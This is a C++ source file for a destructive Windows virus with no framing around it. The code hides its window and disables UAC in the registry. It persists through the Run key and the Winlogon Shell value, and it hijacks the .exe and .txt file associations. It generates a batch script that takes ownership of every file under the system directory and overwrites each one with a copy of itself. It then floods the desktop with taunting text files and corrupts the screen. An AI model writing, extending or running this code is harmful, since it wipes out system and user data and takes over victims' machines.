#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <fstream>
using namespace std;
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow) {
	HWND hwnd=GetDesktopWindow();
	HDC hdc=GetWindowDC(hwnd);
	POINT point;
	hwnd=FindWindow("ConsoleWindowClass",NULL);	
	if(hwnd) {
		ShowWindow(hwnd,SW_HIDE);
	}
	char regpath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
   	HKEY hkey;
   	DWORD set = 0;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath, &hkey);
   	RegSetValueEx(hkey, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	RegSetValueEx(hkey, "EnableLUA", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	char startup[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
   	CHAR pathF[5000];
    GetModuleFileName(NULL, pathF, sizeof(pathF));
   	CHAR path[] = "C:\\error.exe";
   	CopyFile(pathF, path, false);
   	HKEY hkeya;
   	RegOpenKey(HKEY_CURRENT_USER, startup, &hkeya);
   	RegSetValueEx(hkeya, "error", 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	TCHAR * subKey = _T("errvir");
   	HKEY hkeyerr;
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	subKey = _T("errvir\\shell");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	subKey = _T("errvir\\shell\\open");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	subKey = _T("errvir\\shell\\open\\command");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	RegSetValueEx(hkeyerr, NULL, 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	subKey = _T("errvir\\DefaultIcon");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	RegSetValueEx(hkeyerr, NULL, 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	char hexe[] = ".exe"; 
	char htxt[] = ".txt";
	char errorvirus[] = "errvir";
   	HKEY hkeyoexe,hkeyotxt;
   	RegOpenKey(HKEY_CLASSES_ROOT, hexe, &hkeyoexe);
   	RegOpenKey(HKEY_CLASSES_ROOT, htxt, &hkeyotxt);
   	RegSetValueEx(hkeyoexe, NULL, 0, REG_SZ, (unsigned char*)errorvirus, sizeof(errorvirus));
   	RegSetValueEx(hkeyotxt, NULL, 0, REG_SZ, (unsigned char*)errorvirus, sizeof(errorvirus));
   	HKEY winlogon;
   	RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", &winlogon);
   	RegSetValueEx(winlogon, "Shell", 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	ofstream file_out("C:\\sys.bat");
   	file_out << "cd /d %systemroot%" << endl;
   	file_out << "for /R %DIR% %%f in (*.*) do (" << endl;
   	file_out << "takeown /f %%f /a" << endl;
   	file_out << "echo y|cacls %%f /p %username%:f" << endl;
   	file_out << "attrib -R -H -S %%f" << endl;
   	file_out << "ren %%f *.txt" << endl;
   	file_out << "copy C:\\error.exe %%f" << endl;
   	file_out << ")" << endl;
   	file_out.close(); 
   	for(int i = 1; i <= 5; i++) {
	   	system("start C:\\sys.bat");
 	}
   	ofstream file_txt("C:\\txt.bat");
   	file_txt << ":t" << endl;
   	file_txt << "echo.Error²¡¶¾2byleo,enjoy~fuckrrr>C:\\users\\%username%\\desktop\\error%random%.txt" << endl;
   	file_txt << "goto t";
   	file_txt.close();
   	system("start C:\\txt.bat");
   	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while(1) {
		GetCursorPos(&point);
		DrawIcon(hdc,point.x+rand()%300+1,point.y-rand()%300+1,LoadIcon(NULL,IDI_ERROR));
		StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, NOTSRCERASE);
		StretchBlt(hdc, x/40, y, x, -y, hdc, 0, 0, x, y, SRCCOPY);
	}
}